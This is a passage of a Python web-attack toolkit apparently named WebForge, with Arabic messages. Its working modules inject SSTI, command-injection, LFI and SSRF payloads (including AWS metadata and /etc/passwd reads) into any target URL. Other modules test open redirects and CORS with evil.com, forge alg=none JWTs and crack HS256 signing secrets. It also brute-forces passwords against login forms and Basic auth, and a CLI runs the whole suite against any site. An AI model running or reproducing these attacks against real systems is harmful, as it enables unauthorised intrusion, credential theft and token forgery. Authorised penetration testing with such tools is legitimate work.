    base = norm_target(turl)
    for p in params_or_common(turl):
        for pay in SSTI_PAYLOADS:
            st, _, b = get(f"{base}/?{p}={urllib.parse.quote(pay)}")
            if "{{7*7}}" == pay and "49" in b:
                R.vuln(f"SSTI (Blade/Jinja) في المعامل {p}: {{{{7*7}}}} -> 49")
            elif "${7*7}" == pay and "49" in b:
                R.vuln(f"SSTI في المعامل {p}: ${{7*7}} -> 49")
            elif "{{7*'7'}}" == pay and "7777777" in b:
                R.vuln(f"SSTI (Twig) في المعامل {p}: {{{{7*'7'}}}} -> 7777777")
    R.info("اكتمل فحص SSTI")

@module("cmd", "فحص حقن الأوامر")
def m_cmd(turl, a, R):
    base = norm_target(turl)
    for p in params_or_common(turl):
        for pay, marker in CMD_PAYLOADS:
            t1 = time.time()
            st, _, b = get(f"{base}/?{p}={urllib.parse.quote(pay)}")
            dt = time.time() - t1
            if marker and marker in b:
                R.vuln(f"Command Injection في المعامل {p} — مخرجات ظاهرة: {pay}")
            elif marker is None and dt >= 2.5:
                R.vuln(f"Command Injection (زمني) في المعامل {p} — تأخير {dt:.1f}s: {pay}")
    R.info("اكتمل فحص حقن الأوامر")

@module("lfi", "فحص تضمين الملفات المحلية (LFI)")
def m_lfi(turl, a, R):
    base = norm_target(turl)
    for p in params_or_common(turl):
        for pay in LFI_PAYLOADS:
            st, _, b = get(f"{base}/?{p}={urllib.parse.quote(pay)}")
            if "root:" in b and ("/bin/" in b or "daemon" in b):
                R.vuln(f"LFI في المعامل {p}: /etc/passwd مقروء! payload: {pay}")
                break
            if "php://filter" in pay:
                m = re.search(r"cm9vdD" , b)  # "root" base64
                if m or "cm9vdD" in b:
                    R.vuln(f"LFI (php://filter) في المعامل {p} — قراءة ملفات مصدرية!")
                    break
    R.info("اكتمل فحص LFI")

@module("ssrf", "فحص SSRF (يتطلب --callback)")
def m_ssrf(turl, a, R):
    if not a.callback:
        R.info("استخدم --callback http://IP:PORT لفحص SSRF"); return
    base = norm_target(turl)
    ck = a.callback.rstrip("/") + "/ssrf/" + str(random.randint(1000, 9999))
    for p in params_or_common(turl):
        for pay in [ck, "http://169.254.169.254/latest/meta-data/",
                    "http://127.0.0.1:80/", "file:///etc/passwd"]:
            st, _, b = get(f"{base}/?{p}={urllib.parse.quote(pay)}")
            if "ami-id" in b or "instance-id" in b:
                R.vuln(f"SSRF في المعامل {p} — وصل إلى metadata AWS!")
            elif "root:" in b:
                R.vuln(f"SSRF (file://) في المعامل {p} — قرأ /etc/passwd")
        R.warn(f"أرسلنا طلبات SSRF للمعامل {p} — راقب خادمك {a.callback} للاتصالات الواردة")

@module("open-redirect", "فحص التحويل المفتوح")
def m_open_redirect(turl, a, R):
    base = norm_target(turl)
    host = urllib.parse.urlsplit(base).hostname
    for p in REDIRECT_PARAMS:
        st, h, _ = req(f"{base}/?{p}=https://evil.com", redirects=False)
        loc = h.get("location", "")
        if st in (301, 302, 303, 307, 308) and loc:
            lh = urllib.parse.urlsplit(loc).hostname
            if lh and lh != host and "evil.com" in lh:
                R.vuln(f"Open Redirect عبر {p}: {loc[:80]}")
    R.info("اكتمل فحص التحويل المفتوح")

@module("cors", "فحص سوء إعداد CORS")
def m_cors(base, a, R):
    st, h, _ = req(base + "/", headers={"Origin": "https://evil.com"})
    acao = h.get("access-control-allow-origin", "")
    acac = h.get("access-control-allow-credentials", "")
    if acao == "https://evil.com" and acac.lower() == "true":
        R.vuln("CORS خطير: يعكس أي Origin مع Allow-Credentials — سرقة بيانات متقاطعة!")
    elif acao == "*" and acac.lower() == "true":
        R.vuln("CORS: ACAO=* مع Allow-Credentials=true — غير صالح ومخترق")
    elif acao == "https://evil.com":
        R.warn("CORS يعكس Origin لكن بدون Credentials — تحقق من الحساسية")
    else:
        R.good("CORS مضبوط بشكل آمن")

@module("jwt", "تحليل وهجوم JWT (none + كسر المفتاح)")
def m_jwt(base, a, R):
    tok = a.token
    if not tok:
        _, h, _ = get(base + "/")
        sc = h.get("set-cookie", "")
        m = re.search(r"(?:token|jwt)=([A-Za-z0-9_\-\.]+\.[A-Za-z0-9_\-\.]+\.[A-Za-z0-9_\-\.]+)", sc)
        if m: tok = m.group(1)
    if not tok:
        R.info("لا JWT متاح — مرر --token eyJ..."); return
    try:
        hdr, pay, sig = tok.split(".")
    except ValueError:
        R.warn("التوكن ليس JWT صالح"); return
    def b64u(s):
        s += "=" * (-len(s) % 4)
        return base64.urlsafe_b64decode(s)
    try:
        hd = json.loads(b64u(hdr)); pd = json.loads(b64u(pay))
    except Exception:
        R.warn("تعذر فك JWT"); return
    R.good("Header: " + json.dumps(hd))
    R.good("Payload: " + json.dumps(pd))
    exp = pd.get("exp"); now = time.time()
    if exp:
        if now > exp: R.warn("التوكن منتهي الصلاحية")
        else: R.good(f"صلاحيته حتى {time.ctime(exp)}")
    # هجوم alg=none
    if hd.get("alg") == "none":
        R.vuln("alg=none مسموح — يمكن تزوير أي هوية بدون توقيع!")
    else:
        nh = {"alg": "none", "typ": "JWT"}.copy(); nh.update({k: v for k, v in hd.items() if k != "alg"})
        forged = base64.urlsafe_b64encode(json.dumps(nh).encode()).rstrip(b"=").decode() + "." + \
                 base64.urlsafe_b64encode(json.dumps(pd).encode()).rstrip(b"=").decode() + "."
        R.warn("اختبر يدوياً alg=none: " + forged)
    # كسر المفتاح الضعيف HS256
    if hd.get("alg", "").upper().startswith("HS"):
        secrets_list = load_list(a.wordlist) if a.wordlist else JWT_SECRETS
        for sec in secrets_list:
            msg = f"{hdr}.{pay}".encode()
            import hashlib, hmac as hmac_mod
            dg = hmac_mod.new(sec.encode(), msg, hashlib.sha256).digest()
            if base64.urlsafe_b64encode(dg).rstrip(b"=").decode() == sig:
                R.vuln(f"JWT secret مكسور: {sec} — يمكن تزوير توكنات بأي صلاحيات!")
                return
        R.info("لم يُكسر المفتاح بالقائمة المدمجة — جرب --wordlist أكبر")

@module("brute", "هجوم كلمات المرور (Basic + نموذج)")
def m_brute(base, a, R):
    if not a.user:
        R.info("استخدم --user USER مع --wordlist أو --passlist"); return
    if a.login_url:
        up, pp = a.user_param or "username", a.pass_param or "password"
        passes = load_list(a.passlist or a.wordlist or "/dev/null") or PASSES
        for pw in passes:
            data = urllib.parse.urlencode({up: a.user, pp: pw})
            st, h, b = req(base + a.login_url, method="POST", data=data,
                           headers={"Content-Type": "application/x-www-form-urlencoded",
                                    "X-Requested-With": "XMLHttpRequest"})
            low = b.lower()
            if st == 200 and "invalid" not in low and "error" not in low and \
               "incorrect" not in low and "failed" not in low and "wrong" not in low:
                R.vuln(f"تسجيل دخول ناجح: {a.user}:{pw} (HTTP {st})")
                return
            if st in (302, 303):  # تحويل بعد نجاح
                R.vuln(f"تسجيل دخول ناجح (تحويل): {a.user}:{pw} -> {h.get('location','')[:60]}")
                return
        R.info("لا كلمة مرور صالحة في القائمة")
    else:
        passes = load_list(a.passlist or a.wordlist or "/dev/null") or PASSES
        for pw in passes:
            tok = base64.b64encode(f"{a.user}:{pw}".encode()).decode()
            st, _, _ = req(base, headers={"Authorization": f"Basic {tok}"})
            if st not in (401, 403, 0):
                R.vuln(f"Basic auth ناجح: {a.user}:{pw} (HTTP {st})")
                return
        R.info("لا كلمة مرور صالحة في القائمة")

@module("report", "توليد تقرير HTML/Markdown")
def m_report(base, a, R):
    fn = a.out or "report"
    md = [f"# WebForge Report — {base}", ""]
    md.append(f"الوقت: {time.ctime()}")
    md.append(f"النتائج الحرجة: {len(R.finds)}\n")
    if R.finds:
        md.append("## الثغرات\n")
        for f in R.finds: md.append(f"- [ ] {f}")
    md.append("\n## السجل الكامل\n")
    for kind, msg in R.lines: md.append(f"- {kind}: {msg}")
    open(fn + ".md", "w", encoding="utf-8").write("\n".join(md))
    hh = ["<!DOCTYPE html><html><head><meta charset='utf-8'>",
          "<title>WebForge Report</title>",
          "<style>body{font-family:monospace;margin:40px;background:#111;color:#eee}",
          ".vuln{color:#f66}.info{color:#6cf}.warn{color:#fc6}",
          "table{border-collapse:collapse}td,th{border:1px solid #444;padding:6px}</style></head><body>"]
    hh.append(f"<h1>WebForge Report — {html.escape(base)}</h1>")
    hh.append(f"<p>{time.ctime()} — {len(R.finds)} نتيجة حرجة</p>")
    if R.finds:
        hh.append("<h2>الثغرات</h2><table><tr><th>#</th><th>الوصف</th></tr>")
        for i, f in enumerate(R.finds, 1):
            hh.append(f"<tr><td>{i}</td><td class='vuln'>{html.escape(f)}</td></tr>")
        hh.append("</table>")
    hh.append("<h2>السجل</h2><ul>")
    for kind, msg in R.lines:
        cls = "vuln" if kind == "vuln" else ("warn" if kind == "warn" else "info")
        hh.append(f"<li class='{cls}'>{html.escape(msg)}</li>")
    hh.append("</ul></body></html>")
    open(fn + ".html", "w", encoding="utf-8").write("\n".join(hh))
    R.good(f"تقريران: {fn}.md و {fn}.html")

# ---------------------------------------------------------------- CLI
def main():
    ap = argparse.ArgumentParser(description="WebForge — Web App Security Toolkit (27 modules)")
    ap.add_argument("module", nargs="?", help="اسم الوحدة أو --all أو --list")
    ap.add_argument("target", nargs="?", help="URL الهدف، مثال: https://site.com أو https://site.com/item?id=1")
    ap.add_argument("--all", action="store_true", help="تشغيل الحزمة الكاملة")
    ap.add_argument("--list", action="store_true", help="عرض كل الوحدات")
    ap.add_argument("--threads", type=int, default=THREADS)
    ap.add_argument("--timeout", type=int, default=TIMEOUT)
    ap.add_argument("--wordlist", help="ملف كلمات مخصص")
    ap.add_argument("--passlist", help="قائمة كلمات مرور للـ brute")
    ap.add_argument("--user", help="مستخدم للـ brute")
    ap.add_argument("--login-url", help="مسار نموذج الدخول للـ brute")
    ap.add_argument("--user-param", default="username")
    ap.add_argument("--pass-param", default="password")
    ap.add_argument("--token", help="JWT للتحليل")
    ap.add_argument("--callback", help="خادمك لفحص SSRF، مثال: http://10.0.0.5:8000")
    ap.add_argument("--out", default="report", help="اسم ملف التقرير")
    ap.add_argument("--no-report", action="store_true", help="لا تولد تقريراً تلقائياً")
    a = ap.parse_args()

    if a.list or not a.module:
        print(c("=== WebForge — 27 وحدة ===", "1;36"))
        for name, (desc, _) in sorted(MODULES.items()):
            print(f"  {name:<16} {desc}")
        print("\nمثال: python3 webforge.py --all https://target.com")
        return

    if a.module != "report":
        globals()["TIMEOUT"] = a.timeout; globals()["THREADS"] = a.threads

    if a.all or a.module == "--all":
        if not a.target:
            sys.exit("[-] --all يتطلب هدفاً: python3 webforge.py --all https://target.com")
        base = norm_target(a.target)
        print(c(f"\n=== WebForge — الهدف: {base} ===", "1;35"))
        Rr = R(base)
        for name in ALL_SUITE:
            print(c(f"\n--- [{name}] {MODULES[name][0]} ---", "1;34"))
            try:
                fn = MODULES[name][1]
                fn(a.target if name in ("sqli","xss","ssti","cmd","lfi","ssrf","open-redirect") else base, a, Rr)
            except Exception as e:
                Rr.warn(f"وحدة {name} فشلت: {e}")
        if not a.no_report:
            m_report(base, a, Rr)
        print(c(f"\n=== انتهى — {len(Rr.finds)} نتيجة حرجة — راجع report.md / report.html ===", "1;31" if Rr.finds else "1;32"))
        return

    if a.module not in MODULES:
        sys.exit(f"[-] وحدة غير معروفة: {a.module} — استخدم --list")
    if not a.target and a.module not in ("jwt", "brute", "report"):
        sys.exit("[-] اكتب الهدف: python3 webforge.py <module> https://target.com")
    base = norm_target(a.target) if a.target else ""
    Rr = R(base or "؟")
    fn = MODULES[a.module][1]
    fn(a.target if a.module in ("sqli","xss","ssti","cmd","lfi","ssrf","open-redirect") else base, a, Rr)
    if a.module == "report" or (Rr.finds and not a.no_report and a.module != "report"):
        pass
    print(c(f"\n=== انتهى — {len(Rr.finds)} نتيجة حرجة ===", "1;31" if Rr.finds else "1;32"))

if __name__ == "__main__":
    import http.client
    main()
